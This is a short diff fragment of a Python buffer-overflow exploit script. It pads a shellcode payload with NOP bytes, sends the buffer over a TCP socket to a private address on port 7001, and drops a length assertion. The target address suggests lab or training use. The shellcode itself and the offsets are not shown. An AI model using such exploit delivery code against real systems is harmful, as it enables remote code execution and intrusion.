@@ -47,8 +47,6 @@ buffer = bof.concatenate([
     sc                  # Shellcode
 ], length = BUFFER_LENGTH, pad_byte = b'\x90')
 
-assert(len(buffer) == BUFFER_LENGTH)
-
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect(("192.168.208.10", 7001))
     s.send(buffer)
